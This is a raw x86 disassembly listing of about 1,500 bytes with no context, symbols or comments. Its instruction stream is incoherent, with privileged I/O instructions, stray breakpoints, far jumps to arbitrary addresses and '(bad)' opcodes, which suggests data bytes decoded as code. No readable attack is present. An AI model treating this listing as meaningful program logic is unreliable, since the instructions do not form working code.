  4305b3:	83 32 f0             	xorl   $0xfffffff0,(%edx)
  4305b6:	7e 82                	jle    0x43053a
  4305b8:	83 2b e8             	subl   $0xffffffe8,(%ebx)
  4305bb:	74 f0                	je     0x4305ad
  4305bd:	c1 7e d2 66          	sarl   $0x66,-0x2e(%esi)
  4305c1:	da bc f1 7b 9e 3e d0 	fidivrl -0x2fc16185(%ecx,%esi,8)
  4305c8:	21 d6                	and    %edx,%esi
  4305ca:	57                   	push   %edi
  4305cb:	00 bd 0c a7 2a 01    	add    %bh,0x12aa70c(%ebp)
  4305d1:	7d 3e                	jge    0x430611
  4305d3:	d2 b4 70 55 a4 23 9f 	shlb   %cl,-0x60dc5bab(%eax,%esi,2)
  4305da:	86 46 e1             	xchg   %al,-0x1f(%esi)
  4305dd:	30 aa 8e 24 ef 1e    	xor    %ch,0x1eef248e(%edx)
  4305e3:	d3 f9                	sar    %cl,%ecx
  4305e5:	6b 15 8a 87 42 29 00 	imul   $0x0,0x2942878a,%edx
  4305ec:	72 e7                	jb     0x4305d5
  4305ee:	8b 40 c3             	mov    -0x3d(%eax),%eax
  4305f1:	50                   	push   %eax
  4305f2:	21 42 30             	and    %eax,0x30(%edx)
  4305f5:	82 21 10             	andb   $0x10,(%ecx)
  4305f8:	0f 1b 16             	bndstx %bnd2,(%esi)
  4305fb:	ca e0 cd             	lret   $0xcde0
  4305fe:	5f                   	pop    %edi
  4305ff:	e2 67                	loop   0x430668
  430601:	00 71 04             	add    %dh,0x4(%ecx)
  430604:	4f                   	dec    %edi
  430605:	f5                   	cmc
  430606:	f5                   	cmc
  430607:	c9                   	leave
  430608:	6e                   	outsb  %ds:(%esi),(%dx)
  430609:	fa                   	cli
  43060a:	3b 7b 64             	cmp    0x64(%ebx),%edi
  43060d:	c8 ad f3 00          	enter  $0xf3ad,$0x0
  430611:	13 ea                	adc    %edx,%ebp
  430613:	48                   	dec    %eax
  430614:	10 13                	adc    %dl,(%ebx)
  430616:	0c 28                	or     $0x28,%al
  430618:	2c 4c                	sub    $0x4c,%al
  43061a:	f9                   	stc
  43061b:	cd 8b                	int    $0x8b
  43061d:	b2 f2                	mov    $0xf2,%dl
  43061f:	c3                   	ret
  430620:	e1 8e                	loope  0x4305b0
  430622:	13 87 73 66 5e e3    	adc    -0x1ca1998d(%edi),%eax
  430628:	3c 18                	cmp    $0x18,%al
  43062a:	8c 6b 43             	mov    %gs,0x43(%ebx)
  43062d:	ba 9a 01 32 58       	mov    $0x5832019a,%edx
  430632:	38 5d a6             	cmp    %bl,-0x5a(%ebp)
  430635:	2a 36                	sub    (%esi),%dh
  430637:	f8                   	clc
  430638:	33 bc d6 39 32 f1 1b 	xor    0x1bf13239(%esi,%edx,8),%edi
  43063f:	5c                   	pop    %esp
  430640:	ad                   	lods   %ds:(%esi),%eax
  430641:	a1 a1 e0 cd bf       	mov    0xbfcde0a1,%eax
  430646:	9a a1 3c c9 86 c1 64 	lcall  $0x64c1,$0x86c93ca1
  43064d:	2f                   	das
  43064e:	24 6c                	and    $0x6c,%al
  430650:	08 31                	or     %dh,(%ecx)
  430652:	b6 56                	mov    $0x56,%dh
  430654:	c4 bf 24 37 dd 17    	les    0x17dd3724(%edi),%edi
  43065a:	40                   	inc    %eax
  43065b:	f7 4e 6d 48 40 88 56 	testl  $0x56884048,0x6d(%esi)
  430662:	2f                   	das
  430663:	4a                   	dec    %edx
  430664:	a3 47 b4 ed d9       	mov    %eax,0xd9edb447
  430669:	4c                   	dec    %esp
  43066a:	ed                   	in     (%dx),%eax
  43066b:	64 54                	fs push %esp
  43066d:	96                   	xchg   %eax,%esi
  43066e:	f2 ad                	repnz lods %ds:(%esi),%eax
  430670:	99                   	cltd
  430671:	ee                   	out    %al,(%dx)
  430672:	76 e7                	jbe    0x43065b
  430674:	cb                   	lret
  430675:	03 52 dd             	add    -0x23(%edx),%edx
  430678:	5c                   	pop    %esp
  430679:	db 98 f4 9e 97 91    	fistpl -0x6e68610c(%eax)
  43067f:	70 3f                	jo     0x4306c0
  430681:	bc 76 e3 89 dc       	mov    $0xdc89e376,%esp
  430686:	50                   	push   %eax
  430687:	86 5e a8             	xchg   %bl,-0x58(%esi)
  43068a:	46                   	inc    %esi
  43068b:	30 55 5e             	xor    %dl,0x5e(%ebp)
  43068e:	0f 05                	syscall
  430690:	22 34 c5 f2 08 59 d7 	and    -0x28a6f70e(,%eax,8),%dh
  430697:	31 bc 8e c5 ca c0 fd 	xor    %edi,-0x23f353b(%esi,%ecx,4)
  43069e:	7f 60                	jg     0x430700
  4306a0:	e5 e9                	in     $0xe9,%eax
  4306a2:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4306a3:	b6 af                	mov    $0xaf,%dh
  4306a5:	9d                   	popf
  4306a6:	66 be 3a 52          	mov    $0x523a,%si
  4306aa:	cc                   	int3
  4306ab:	60                   	pusha
  4306ac:	91                   	xchg   %eax,%ecx
  4306ad:	78 35                	js     0x4306e4
  4306af:	9f                   	lahf
  4306b0:	13 17                	adc    (%edi),%edx
  4306b2:	a0 66 9f eb 86       	mov    0x86eb9f66,%al
  4306b7:	cc                   	int3
  4306b8:	ba 02 18 74 5c       	mov    $0x5c741802,%edx
  4306bd:	78 f1                	js     0x4306b0
  4306bf:	9b                   	fwait
  4306c0:	ba 00 10 ce 8a       	mov    $0x8ace1000,%edx
  4306c5:	59                   	pop    %ecx
  4306c6:	7f f0                	jg     0x4306b8
  4306c8:	66 a3 d6 5b a5 a5    	mov    %ax,0xa5a55bd6
  4306ce:	ee                   	out    %al,(%dx)
  4306cf:	98                   	cwtl
  4306d0:	1b 9b b8 f6 53 40    	sbb    0x4053f6b8(%ebx),%ebx
  4306d6:	1d a8 8b d9 47       	sbb    $0x47d98ba8,%eax
  4306db:	3f                   	aas
  4306dc:	d8 c6                	fadd   %st(6),%st
  4306de:	4e                   	dec    %esi
  4306df:	c2 d7 74             	ret    $0x74d7
  4306e2:	58                   	pop    %eax
  4306e3:	bc 43 31 2f 58       	mov    $0x582f3143,%esp
  4306e8:	e3 ff                	jecxz  0x4306e9
  4306ea:	4c                   	dec    %esp
  4306eb:	d7                   	xlat   %ds:(%ebx)
  4306ec:	30 06                	xor    %al,(%esi)
  4306ee:	d8 6c b5 9d          	fsubrs -0x63(%ebp,%esi,4)
  4306f2:	02 b9 0d b4 aa 49    	add    0x49aab40d(%ecx),%bh
  4306f8:	37                   	aaa
  4306f9:	92                   	xchg   %eax,%edx
  4306fa:	ba 62 c1 e0 79       	mov    $0x79e0c162,%edx
  4306ff:	ad                   	lods   %ds:(%esi),%eax
  430700:	3a c3                	cmp    %bl,%al
  430702:	22 b7 9a 1d cf 05    	and    0x5cf1d9a(%edi),%dh
  430708:	37                   	aaa
  430709:	12 8d c3 d1 55 fe    	adc    -0x1aa2e3d(%ebp),%cl
  43070f:	32 4e ea             	xor    -0x16(%esi),%cl
  430712:	39 7b fa             	cmp    %edi,-0x6(%ebx)
  430715:	13 8a 24 28 a2 08    	adc    0x8a22824(%edx),%ecx
  43071b:	62 96 b0 de c5 4a    	bound  %edx,0x4ac5deb0(%esi)
  430721:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  430722:	3a 9a 10 b7 b5 d7    	cmp    -0x284a48f0(%edx),%bl
  430728:	6b 76 51 cf          	imul   $0xffffffcf,0x51(%esi),%esi
  43072c:	cc                   	int3
  43072d:	9e                   	sahf
  43072e:	cd 9a                	int    $0x9a
  430730:	e5 13                	in     $0x13,%eax
  430732:	b6 b4                	mov    $0xb4,%dh
  430734:	91                   	xchg   %eax,%ecx
  430735:	6a fd                	push   $0xfffffffd
  430737:	d2 66 5d             	shlb   %cl,0x5d(%esi)
  43073a:	7d 7d                	jge    0x4307b9
  43073c:	38 95 d7 a4 49 b0    	cmp    %dl,-0x4fb65b29(%ebp)
  430742:	ec                   	in     (%dx),%al
  430743:	84 35 ee 53 b8 df    	test   %dh,0xdfb853ee
  430749:	76 c1                	jbe    0x43070c
  43074b:	b9 ad 1c df 7a       	mov    $0x7adf1cad,%ecx
  430750:	2f                   	das
  430751:	df 52 5e             	fists  0x5e(%edx)
  430754:	e4 99                	in     $0x99,%al
  430756:	0d 8b 51 e4 c2       	or     $0xc2e4518b,%eax
  43075b:	6d                   	insl   (%dx),%es:(%edi)
  43075c:	d3 b7 4c aa 79 1f    	shll   %cl,0x1f79aa4c(%edi)
  430762:	56                   	push   %esi
  430763:	dd c1                	ffree  %st(1)
  430765:	e0 db                	loopne 0x430742
  430767:	0b d4                	or     %esp,%edx
  430769:	2c 5d                	sub    $0x5d,%al
  43076b:	7c 81                	jl     0x4306ee
  43076d:	c4 78 46             	les    0x46(%eax),%edi
  430770:	00 61 08             	add    %ah,0x8(%ecx)
  430773:	ae                   	scas   %es:(%edi),%al
  430774:	01 5d 6e             	add    %ebx,0x6e(%ebp)
  430777:	ec                   	in     (%dx),%al
  430778:	af                   	scas   %es:(%edi),%eax
  430779:	cc                   	int3
  43077a:	ec                   	in     (%dx),%al
  43077b:	e7 54                	out    %eax,$0x54
  43077d:	dc 29                	fsubrl (%ecx)
  43077f:	c1 8a 5c be ba 80 d5 	rorl   $0xd5,-0x7f4541a4(%edx)
  430786:	87 4f d1             	xchg   %ecx,-0x2f(%edi)
  430789:	74 4c                	je     0x4307d7
  43078b:	a2 6f e9 2c 4b       	mov    %al,0x4b2ce96f
  430790:	06                   	push   %es
  430791:	30 43 3e             	xor    %al,0x3e(%ebx)
  430794:	07                   	pop    %es
  430795:	65 62 94 b9 6f a6 fc 	bound  %edx,%gs:-0x27035991(%ecx,%edi,4)
  43079c:	d8 
  43079d:	8b ac 15 a9 1c fe b5 	mov    -0x4a01e357(%ebp,%edx,1),%ebp
  4307a4:	0c 67                	or     $0x67,%al
  4307a6:	90                   	nop
  4307a7:	6c                   	insb   (%dx),%es:(%edi)
  4307a8:	eb 5c                	jmp    0x430806
  4307aa:	fd                   	std
  4307ab:	0d 1d da a3 f7       	or     $0xf7a3da1d,%eax
  4307b0:	ee                   	out    %al,(%dx)
  4307b1:	d7                   	xlat   %ds:(%ebx)
  4307b2:	dd fe                	(bad)
  4307b4:	2f                   	das
  4307b5:	23 55 13             	and    0x13(%ebp),%edx
  4307b8:	19 d8                	sbb    %ebx,%eax
  4307ba:	e8 44 c4 e0 24       	call   0x2523cc03
  4307bf:	96                   	xchg   %eax,%esi
  4307c0:	39 15 c4 78 55 11    	cmp    %edx,0x115578c4
  4307c6:	eb 30                	jmp    0x4307f8
  4307c8:	02 6e a5             	add    -0x5b(%esi),%ch
  4307cb:	91                   	xchg   %eax,%ecx
  4307cc:	fc                   	cld
  4307cd:	cc                   	int3
  4307ce:	b1 ce                	mov    $0xce,%cl
  4307d0:	2a 48 87             	sub    -0x79(%eax),%cl
  4307d3:	01 e4                	add    %esp,%esp
  4307d5:	4d                   	dec    %ebp
  4307d6:	95                   	xchg   %eax,%ebp
  4307d7:	fc                   	cld
  4307d8:	7b dc                	jnp    0x4307b6
  4307da:	dd 11                	fstl   (%ecx)
  4307dc:	ea d8 44 49 16 53 9f 	ljmp   $0x9f53,$0x164944d8
  4307e3:	c2 6d 28             	ret    $0x286d
  4307e6:	62 bf 16 26 68 de    	bound  %edi,-0x2197d9ea(%edi)
  4307ec:	80 d2 10             	adc    $0x10,%dl
  4307ef:	b8 ed 13 2a 82       	mov    $0x822a13ed,%eax
  4307f4:	e0 f4                	loopne 0x4307ea
  4307f6:	ed                   	in     (%dx),%eax
  4307f7:	a2 97 1e c0 8c       	mov    %al,0x8cc01e97
  4307fc:	f1                   	int1
  4307fd:	f3 af                	repz scas %es:(%edi),%eax
  4307ff:	2f                   	das
  430800:	8d 4e 0f             	lea    0xf(%esi),%ecx
  430803:	40                   	inc    %eax
  430804:	f4                   	hlt
  430805:	b3 46                	mov    $0x46,%bl
  430807:	b2 07                	mov    $0x7,%dl
  430809:	ea 84 6d 58 e9 67 89 	ljmp   $0x8967,$0xe9586d84
  430810:	43                   	inc    %ebx
  430811:	ed                   	in     (%dx),%eax
  430812:	f1                   	int1
  430813:	16                   	push   %ss
  430814:	aa                   	stos   %al,%es:(%edi)
  430815:	a3 29 57 21 4b       	mov    %eax,0x4b215729
  43081a:	08 27                	or     %ah,(%edi)
  43081c:	66 98                	cbtw
  43081e:	a0 4b 2a ee 92       	mov    0x92ee2a4b,%al
  430823:	6c                   	insb   (%dx),%es:(%edi)
  430824:	44                   	inc    %esp
  430825:	3e da c4             	ds fcmovb %st(4),%st
  430828:	30 4d 80             	xor    %cl,-0x80(%ebp)
  43082b:	50                   	push   %eax
  43082c:	83 6d 24 e3          	subl   $0xffffffe3,0x24(%ebp)
  430830:	b8 4c 18 9f 28       	mov    $0x289f184c,%eax
  430835:	f6 ff                	idiv   %bh
  430837:	a3 bf 96 77 5b       	mov    %eax,0x5b7796bf
  43083c:	43                   	inc    %ebx
  43083d:	ba 34 31 5c 0e       	mov    $0xe5c3134,%edx
  430842:	11 6e 3b             	adc    %ebp,0x3b(%esi)
  430845:	88 32                	mov    %dh,(%edx)
  430847:	a0 51 27 38 4d       	mov    0x4d382751,%al
  43084c:	57                   	push   %edi
  43084d:	f5                   	cmc
  43084e:	5f                   	pop    %edi
  43084f:	13 45 ed             	adc    -0x13(%ebp),%eax
  430852:	0c d1                	or     $0xd1,%al
  430854:	ee                   	out    %al,(%dx)
  430855:	89 f9                	mov    %edi,%ecx
  430857:	e6 33                	out    %al,$0x33
  430859:	76 ac                	jbe    0x430807
  43085b:	7a ab                	jp     0x430808
  43085d:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  43085e:	fb                   	sti
  43085f:	5e                   	pop    %esi
  430860:	65 43                	gs inc %ebx
  430862:	d3 a2 85 80 63 a7    	shll   %cl,-0x589c7f7b(%edx)
  430868:	fe                   	(bad)
  430869:	3a ce                	cmp    %dh,%cl
  43086b:	d3 03                	roll   %cl,(%ebx)
  43086d:	e1 65                	loope  0x4308d4
  43086f:	bd 7e 11 cc 24       	mov    $0x24cc117e,%ebp
  430874:	7e ba                	jle    0x430830
  430876:	c3                   	ret
  430877:	0c f7                	or     $0xf7,%al
  430879:	8b f3                	mov    %ebx,%esi
  43087b:	9a cf 3f 20 f0 21 26 	lcall  $0x2621,$0xf0203fcf
  430882:	b4 b0                	mov    $0xb0,%ah
  430884:	32 b7 df cf 14 b3    	xor    -0x4ceb3021(%edi),%dh
  43088a:	a3 80 07 fe 42       	mov    %eax,0x42fe0780
  43088f:	02 be e5 5d cd 84    	add    -0x7b32a21b(%esi),%bh
  430895:	aa                   	stos   %al,%es:(%edi)
  430896:	4c                   	dec    %esp
  430897:	de 77 94             	fidivs -0x6c(%edi)
  43089a:	fe 86 6f 5c 80 73    	incb   0x73805c6f(%esi)
  4308a0:	e9 2e 2b e1 51       	jmp    0x522433d3
  4308a5:	71 c0                	jno    0x430867
  4308a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4308a8:	85 70 27             	test   %esi,0x27(%eax)
  4308ab:	86 86 09 79 f8 b0    	xchg   %al,-0x4f0786f7(%esi)
  4308b1:	e9 80 4b 2a 48       	jmp    0x486d5436
  4308b6:	04 e6                	add    $0xe6,%al
  4308b8:	70 c8                	jo     0x430882
  4308ba:	68 9f b5 12 4b       	push   $0x4b12b59f
  4308bf:	e5 9d                	in     $0x9d,%eax
  4308c1:	40                   	inc    %eax
  4308c2:	ac                   	lods   %ds:(%esi),%al
  4308c3:	bf 41 9c 1d 28       	mov    $0x281d9c41,%edi
  4308c8:	62 64 cf d7          	bound  %esp,-0x29(%edi,%ecx,8)
  4308cc:	86 2d 1a a9 00 1e    	xchg   %ch,0x1e00a91a
  4308d2:	b1 55                	mov    $0x55,%cl
  4308d4:	98                   	cwtl
  4308d5:	2d 51 2e e6 4f       	sub    $0x4fe62e51,%eax
  4308da:	02 18                	add    (%eax),%bl
  4308dc:	f1                   	int1
  4308dd:	11 c7                	adc    %eax,%edi
  4308df:	54                   	push   %esp
  4308e0:	41                   	inc    %ecx
  4308e1:	7d 7e                	jge    0x430961
  4308e3:	02 4b 23             	add    0x23(%ebx),%cl
  4308e6:	16                   	push   %ss
  4308e7:	f1                   	int1
  4308e8:	23 60 d4             	and    -0x2c(%eax),%esp
  4308eb:	2f                   	das
  4308ec:	2d 4a 20 df e5       	sub    $0xe5df204a,%eax
  4308f1:	d9 4c 69 2c          	(bad) 0x2c(%ecx,%ebp,2)
  4308f5:	35 f6 68 66 09       	xor    $0x96668f6,%eax
  4308fa:	ea 10 0a 0d 48 2d 13 	ljmp   $0x132d,$0x480d0a10
  430901:	b5 70                	mov    $0x70,%ch
  430903:	6d                   	insl   (%dx),%es:(%edi)
  430904:	bb 04 71 33 e7       	mov    $0xe7337104,%ebx
  430909:	36 10 23             	adc    %ah,%ss:(%ebx)
  43090c:	5b                   	pop    %ebx
  43090d:	03 34 17             	add    (%edi,%edx,1),%esi
  430910:	42                   	inc    %edx
  430911:	09 e1                	or     %esp,%ecx
  430913:	02 f8                	add    %al,%bh
  430915:	d8 2d 2b 98 26 7a    	fsubrs 0x7a26982b
  43091b:	be c5 ed de 8a       	mov    $0x8adeedc5,%esi
  430920:	99                   	cltd
  430921:	5c                   	pop    %esp
  430922:	2d 3d 1d a7 af       	sub    $0xafa71d3d,%eax
  430927:	a2 39 a9 38 f2       	mov    %al,0xf238a939
  43092c:	4b                   	dec    %ebx
  43092d:	e0 c6                	loopne 0x4308f5
  43092f:	84 d3                	test   %dl,%bl
  430931:	8d a8 b4 33 c4 83    	lea    -0x7c3bcc4c(%eax),%ebp
  430937:	fa                   	cli
  430938:	1c 2b                	sbb    $0x2b,%al
  43093a:	0d 16 ff 97 74       	or     $0x7497ff16,%eax
  43093f:	dd 80 a3 07 ae 98    	fldl   -0x6751f85d(%eax)
  430945:	3a 20                	cmp    (%eax),%ah
  430947:	7b d5                	jnp    0x43091e
  430949:	67 f2 f8             	addr16 repnz clc
  43094c:	9d                   	popf
  43094d:	18 b4 da fe c4 3c 09 	sbb    %dh,0x93cc4fe(%edx,%ebx,8)
  430954:	76 19                	jbe    0x43096f
  430956:	14 e6                	adc    $0xe6,%al
  430958:	de 55 dc             	ficoms -0x24(%ebp)
  43095b:	ac                   	lods   %ds:(%esi),%al
  43095c:	6e                   	outsb  %ds:(%esi),(%dx)
  43095d:	cd 5c                	int    $0x5c
  43095f:	c8 5b de 41          	enter  $0xde5b,$0x41
  430963:	a2 5e 44 59 d8       	mov    %al,0xd859445e
  430968:	cb                   	lret
  430969:	73 49                	jae    0x4309b4
  43096b:	13 e5                	adc    %ebp,%esp
  43096d:	32 d3                	xor    %bl,%dl
  43096f:	58                   	pop    %eax
  430970:	61                   	popa
  430971:	df 41 ed             	filds  -0x13(%ecx)
  430974:	fb                   	sti
  430975:	a1 43 5d 32 72       	mov    0x72325d43,%eax
  43097a:	72 78                	jb     0x4309f4
  43097c:	30 d0                	xor    %dl,%al
  43097e:	d9 70 da             	fnstenv -0x26(%eax)
  430981:	c2 83 bc             	ret    $0xbc83
  430984:	96                   	xchg   %eax,%esi
  430985:	24 0e                	and    $0xe,%al
  430987:	f6 4b 9e e9          	testb  $0xe9,-0x62(%ebx)
  43098b:	0a f6                	or     %dh,%dh
  43098d:	a0 6d f4 9a 81       	mov    0x819af46d,%al
  430992:	3a a2 59 1e 7f 45    	cmp    0x457f1e59(%edx),%ah
  430998:	3a a3 46 cb 17 37    	cmp    0x3717cb46(%ebx),%ah
  43099e:	51                   	push   %ecx
  43099f:	e0 98                	loopne 0x430939
  4309a1:	68 50 81 75 7f       	push   $0x7f758150
  4309a6:	24 95                	and    $0x95,%al
  4309a8:	ca a7 ed             	lret   $0xeda7
  4309ab:	d2 46 4c             	rolb   %cl,0x4c(%esi)
  4309ae:	9f                   	lahf
  4309af:	ea 4d 5b 7e 4d 05 07 	ljmp   $0x705,$0x4d7e5b4d
  4309b6:	62 b6 6e fe aa 9f    	bound  %esi,-0x60550192(%esi)
  4309bc:	08 79 6a             	or     %bh,0x6a(%ecx)
  4309bf:	24 69                	and    $0x69,%al
  4309c1:	3a 24 0d 69 d9 5e 41 	cmp    0x415ed969(,%ecx,1),%ah
  4309c8:	d1 6b f5             	shrl   $1,-0xb(%ebx)
  4309cb:	2d a8 a9 ce 97       	sub    $0x97cea9a8,%eax
  4309d0:	9b                   	fwait
  4309d1:	28 9e 36 ef 9e 3e    	sub    %bl,0x3e9eef36(%esi)
  4309d7:	81 0f df cb 24 11    	orl    $0x1124cbdf,(%edi)
  4309dd:	4c                   	dec    %esp
  4309de:	9b                   	fwait
  4309df:	8e 02                	mov    (%edx),%es
  4309e1:	e7 85                	out    %eax,$0x85
  4309e3:	ed                   	in     (%dx),%eax
  4309e4:	1d b4 41 aa b3       	sbb    $0xb3aa41b4,%eax
  4309e9:	b3 54                	mov    $0x54,%bl
  4309eb:	d0 a1 b7 e2 b4 2a    	shlb   $1,0x2ab4e2b7(%ecx)
  4309f1:	f2 58                	repnz pop %eax
  4309f3:	a8 35                	test   $0x35,%al
  4309f5:	e0 84                	loopne 0x43097b
  4309f7:	27                   	daa
  4309f8:	9f                   	lahf
  4309f9:	78 ce                	js     0x4309c9
  4309fb:	26 92                	es xchg %eax,%edx
  4309fd:	df 90 63 ed 9a fe    	fists  -0x165129d(%eax)
  430a03:	6f                   	outsl  %ds:(%esi),(%dx)
  430a04:	ff 64 b5 66          	jmp    *0x66(%ebp,%esi,4)
  430a08:	0f 43 37             	cmovae (%edi),%esi
  430a0b:	0b 93 fe 99 9a c1    	or     -0x3e656602(%ebx),%edx
  430a11:	95                   	xchg   %eax,%ebp
  430a12:	8a c5                	mov    %ch,%al
  430a14:	cf                   	iret
  430a15:	c1 23 37             	shll   $0x37,(%ebx)
  430a18:	bf 85 b3 5f d4       	mov    $0xd45fb385,%edi
  430a1d:	e5 1d                	in     $0x1d,%eax
  430a1f:	e9 31 3b 2d 92       	jmp    0x92704555
  430a24:	92                   	xchg   %eax,%edx
  430a25:	39 fd                	cmp    %edi,%ebp
  430a27:	2c 37                	sub    $0x37,%al
  430a29:	5b                   	pop    %ebx
  430a2a:	22 f3                	and    %bl,%dh
  430a2c:	7e 15                	jle    0x430a43
  430a2e:	71 7d                	jno    0x430aad
  430a30:	cd f5                	int    $0xf5
  430a32:	ef                   	out    %eax,(%dx)
  430a33:	ae                   	scas   %es:(%edi),%al
  430a34:	8e 1e                	mov    (%esi),%ds
  430a36:	c2 a4 70             	ret    $0x70a4
  430a39:	14 83                	adc    $0x83,%al
  430a3b:	63 5e 06             	arpl   %ebx,0x6(%esi)
  430a3e:	74 a6                	je     0x4309e6
  430a40:	0e                   	push   %cs
  430a41:	b8 e2 60 90 89       	mov    $0x899060e2,%eax
  430a46:	27                   	daa
  430a47:	5d                   	pop    %ebp
  430a48:	9b                   	fwait
  430a49:	46                   	inc    %esi
  430a4a:	26 c9                	es leave
  430a4c:	8c 53 38             	mov    %ss,0x38(%ebx)
  430a4f:	28 55 b8             	sub    %dl,-0x48(%ebp)
  430a52:	46                   	inc    %esi
  430a53:	9a bd d4 9b c7 da c3 	lcall  $0xc3da,$0xc79bd4bd
  430a5a:	95                   	xchg   %eax,%ebp
  430a5b:	b2 9d                	mov    $0x9d,%dl
  430a5d:	5f                   	pop    %edi
  430a5e:	08 f1                	or     %dh,%cl
  430a60:	42                   	inc    %edx
  430a61:	73 39                	jae    0x430a9c
  430a63:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  430a64:	91                   	xchg   %eax,%ecx
  430a65:	04 07                	add    $0x7,%al
  430a67:	7f 05                	jg     0x430a6e
  430a69:	63 e6                	arpl   %esp,%esi
  430a6b:	d9 ab e2 a9 59 02    	fldcw  0x259a9e2(%ebx)
  430a71:	c5 ea be             	(bad)
  430a74:	38 5c a2 f9          	cmp    %bl,-0x7(%edx,%eiz,4)
  430a78:	82 00 f2             	addb   $0xf2,(%eax)
  430a7b:	77 cd                	ja     0x430a4a
  430a7d:	74 df                	je     0x430a5e
  430a7f:	bc b8 09 aa 0a       	mov    $0xaaa09b8,%esp
  430a84:	df 17                	fists  (%edi)
  430a86:	33 8f 63 db 10 d9    	xor    -0x26ef249d(%edi),%ecx
  430a8c:	21 cb                	and    %ecx,%ebx
  430a8e:	cf                   	iret
  430a8f:	5a                   	pop    %edx
  430a90:	62 9e ab 22 f5 63    	bound  %ebx,0x63f522ab(%esi)
  430a96:	68 35 19 e9 89       	push   $0x89e91935
  430a9b:	8c 35 ff 6f 3a a5    	mov    %?,0xa53a6fff
  430aa1:	8e 66 15             	mov    0x15(%esi),%fs
  430aa4:	f4                   	hlt
  430aa5:	7f 98                	jg     0x430a3f
  430aa7:	b8 97 da 9a 24       	mov    $0x249ada97,%eax
  430aac:	65 d0 a7 a8 09 ac ff 	shlb   $1,%gs:-0x53f658(%edi)
  430ab3:	99                   	cltd
  430ab4:	93                   	xchg   %eax,%ebx
  430ab5:	86 f8                	xchg   %bh,%al
  430ab7:	16                   	push   %ss
  430ab8:	fb                   	sti
  430ab9:	a0 b6 24 24 77       	mov    0x772424b6,%al
  430abe:	84 48 cd             	test   %cl,-0x33(%eax)
  430ac1:	eb 02                	jmp    0x430ac5
  430ac3:	54                   	push   %esp
  430ac4:	22 31                	and    (%ecx),%dh
  430ac6:	e2 1d                	loop   0x430ae5
  430ac8:	d6                   	salc
  430ac9:	4e                   	dec    %esi
  430aca:	5a                   	pop    %edx
  430acb:	a2 df d5 d9 b5       	mov    %al,0xb5d9d5df
  430ad0:	53                   	push   %ebx
  430ad1:	b7 7d                	mov    $0x7d,%bh
  430ad3:	4b                   	dec    %ebx
  430ad4:	64 85 2b             	test   %ebp,%fs:(%ebx)
  430ad7:	46                   	inc    %esi
  430ad8:	bf 11 fa af cb       	mov    $0xcbaffa11,%edi
  430add:	94                   	xchg   %eax,%esp
  430ade:	ab                   	stos   %eax,%es:(%edi)
  430adf:	cb                   	lret
  430ae0:	ce                   	into
  430ae1:	8d 27                	lea    (%edi),%esp
  430ae3:	61                   	popa
  430ae4:	c4 59 1e             	les    0x1e(%ecx),%ebx
  430ae7:	08 b6 b6 a4 3d 24    	or     %dh,0x243da4b6(%esi)
  430aed:	17                   	pop    %ss
  430aee:	66 20 c6             	data16 and %al,%dh
  430af1:	a0 0b 79 f5 87       	mov    0x87f5790b,%al
  430af6:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  430af7:	34 4a                	xor    $0x4a,%al
  430af9:	34 ea                	xor    $0xea,%al
  430afb:	a3 13 c1 93 b7       	mov    %eax,0xb793c113
  430b00:	c8 f6 3b 8a          	enter  $0x3bf6,$0x8a
  430b04:	5e                   	pop    %esi
  430b05:	a3 22 80 d7 a2       	mov    %eax,0xa2d78022
  430b0a:	03 0f                	add    (%edi),%ecx
  430b0c:	d5 c9                	aad    $0xc9
  430b0e:	07                   	pop    %es
  430b0f:	31 d9                	xor    %ebx,%ecx
  430b11:	f9                   	stc
  430b12:	ba b5 78 bd 0a       	mov    $0xabd78b5,%edx
  430b17:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  430b18:	0f ce                	bswap  %esi
  430b1a:	b6 63                	mov    $0x63,%dh
  430b1c:	29 8f cb 33 fe bf    	sub    %ecx,-0x4001cc35(%edi)
  430b22:	70 a9                	jo     0x430acd
  430b24:	e0 40                	loopne 0x430b66
  430b26:	aa                   	stos   %al,%es:(%edi)
  430b27:	52                   	push   %edx
  430b28:	03 ac 05 ed 33 cf 4b 	add    0x4bcf33ed(%ebp,%eax,1),%ebp
  430b2f:	bb 8c aa 13 80       	mov    $0x8013aa8c,%ebx
  430b34:	64 c6                	fs (bad)
  430b36:	31 dd                	xor    %ebx,%ebp
  430b38:	f1                   	int1
  430b39:	91                   	xchg   %eax,%ecx
  430b3a:	74 7e                	je     0x430bba
  430b3c:	53                   	push   %ebx
  430b3d:	3c df                	cmp    $0xdf,%al
  430b3f:	45                   	inc    %ebp
  430b40:	5b                   	pop    %ebx
  430b41:	61                   	popa
  430b42:	0b 38                	or     (%eax),%edi
  430b44:	c7                   	(bad)
  430b45:	a1 0b 6d 2a 19       	mov    0x192a6d0b,%eax
  430b4a:	ac                   	lods   %ds:(%esi),%al
  430b4b:	6f                   	outsl  %ds:(%esi),(%dx)
  430b4c:	ab                   	stos   %eax,%es:(%edi)
  430b4d:	da 38                	fidivrl (%eax)
  430b4f:	c0 36 d9             	shlb   $0xd9,(%esi)
  430b52:	58                   	pop    %eax
  430b53:	78 03                	js     0x430b58
  430b55:	9e                   	sahf
  430b56:	d9 ae d8 b2 a5 6d    	fldcw  0x6da5b2d8(%esi)
  430b5c:	14 ba                	adc    $0xba,%al
  430b5e:	db 9c 61 e4 3e fb 7f 	fistpl 0x7ffb3ee4(%ecx,%eiz,2)
  430b65:	23 6f 6f             	and    0x6f(%edi),%ebp
  430b68:	1b 2d dc fe ef b0    	sbb    0xb0effedc,%ebp
  430b6e:	5e                   	pop    %esi
  430b6f:	e9 06 83 87 cb       	jmp    0xcbca8e7a
  430b74:	b6 6d                	mov    $0x6d,%dh
  430b76:	d6                   	salc
  430b77:	b1 95                	mov    $0x95,%cl
  430b79:	7e 29                	jle    0x430ba4
  430b7b:	be 69 74 0d 1d       	mov    $0x1d0d7469,%esi
  430b80:	c4                   	(bad)
  430b81:	d1 8d 76 d7 0a 53    	rorl   $1,0x530ad776(%ebp)
  430b87:	6d                   	insl   (%dx),%es:(%edi)
  430b88:	2c 10                	sub    $0x10,%al
  430b8a:	e2 5d                	loop   0x430be9
  430b8c:	48                   	dec    %eax
  430b8d:	8f                   	(bad)
  430b8e:	a2 c8 5a 75 15       	mov    %al,0x15755ac8
  430b93:	e1 3b                	loope  0x430bd0
  430b95:	07                   	pop    %es
